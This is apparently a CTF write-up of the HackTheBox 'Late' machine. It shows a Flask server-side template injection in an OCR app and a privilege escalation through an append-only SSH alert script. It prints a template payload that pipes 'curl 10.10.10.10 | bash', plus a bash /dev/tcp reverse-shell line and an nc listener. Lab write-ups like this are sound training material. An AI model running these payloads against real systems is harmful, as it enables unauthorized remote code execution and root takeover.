---
layout: post
title: HackTheBox - Late - Write-up
difficulty: easy
tags: [ssti, hashcat]
---
***

## Quick Hits:

| Info | Details |
| ---- | ------- |
| **IP Address** | 10.10.11.156 |
| **Difficulty** | 🟢 Easy |
| **Exploits** | Server-Side Template Injection |
| **Tools Used** |  |
| **Techniques Used** |  |
| **Interesting Files** |  |

#### Port Scan Results:

| Port | State | Service | Version |
| ---- | ----- | ------- | ------- |
| 22/tcp | open | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | open | http | nginx 1.14.0 (Ubuntu) |

***

## Walk-through

Visiting the website leads us to a simple landing page with marketing materials for an online photo editor. Going through the pages within the site gives us a link to `images.late.htb`, which we can include in our `/etc/hosts` file to browse.

#### Server-Side Template Injection

The `images.late.htb` site contains an Image to Text conversion application. It uses some Optical Character Recognition (OCR) library to detect any text from an image, and return it back in the response. This application seems to be an implementation of [lucadibello/ImageReader](https://github.com/lucadibello/ImageReader), which renders the `text` output using the `render_template` function.

``` python
@app.route('/result')
def result():
    if "data" in session:
        data = session['data']
        return render_template(
            "result.html",
            title="Result",
            time=data["time"],
            text=data["text"],
            words=len(data["text"].split(" "))
        )
    else:
        return "Wrong request method."
```

In Flask, the `render_template` function allows us to evaluate expressions using the `{{ ... }}` syntax. For example, mathematical expressions such as `{{7*7}}` would be evaluated and would result in an output of `49`. We can use this technique to execute code using the Flask engine.

We can create and image that simply says: `{{7*7}}`, and just as we thought, it gave us the following response, confirming the Server-Site Template Injection:

``` html
<p>49
</p>
```

This required a lot of tinkering of the image to get the exploit to work. The OCR was not particularly consistent, so a lot of characters were interpreted differently. In the end, I was able to create an image with the following payload to successfully create a reverse shell connection back to my machine:

``` python
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen("curl 10.10.10.10 | bash".read() }}
```

###### ***Note:*** I hosted a Reverse-Shell Bash script in an HTTP server so that it can pipe that over to `bash` after `curl`ing it.

***And, we're in!***

#### Privilege Escalation

Running `linpeas.sh` would give us back an interesting script file: `/usr/local/sbin/ssh-alert.sh`. This seems to sends an email notification to `root@late.htb` whenever an SSH login is detected.

``` bash
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

When we check the file, it's actually owned by our current user `svc_acc`. So, we can change the script and it will execute our code when an SSH login is detected. However, when we try doing so, we are blocked because the `a` attribute for the file is set, meaning we can only append to it.

```
svc_acc@late:~$ ls -l /usr/local/sbin/ssh-alert.sh
-rwxr-xr-x 1 svc_acc svc_acc 433 Jul 25 21:01 /usr/local/sbin/ssh-alert.sh

svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh
-----a--------e--- /usr/local/sbin/ssh-alert.sh
```

We can simply append a reverse-shell command to the `ssh-alert.sh` script to connect back to our machine. But first, we need to be able to login using SSH first. To do so, we can get the SSH private key of `svc_acct` from `home/svc_acc/.ssh/id_rsa` and copy it over to our machine.

```
svc_acc@late:/usr/local/sbin$ echo "bash -i >& /dev/tcp/10.10.10.10/37117 0>&1" >> ssh-alert.sh
```

Finally, we can then listen for the reverse-shell connection and use the private key of the `svc_acct` (`id_rsa`) to login through SSH, triggering the code we appended.

```
$ nc -nlvp 37117
listening on [any] 37117 ...
connect to [10.10.10.10] from late.htb [10.10.11.156] 41502
bash: cannot set terminal process group (1975): Inappropriate ioctl for device
bash: no job control in this shell
root@late:/# whoami
root
```
***And, we're done!***
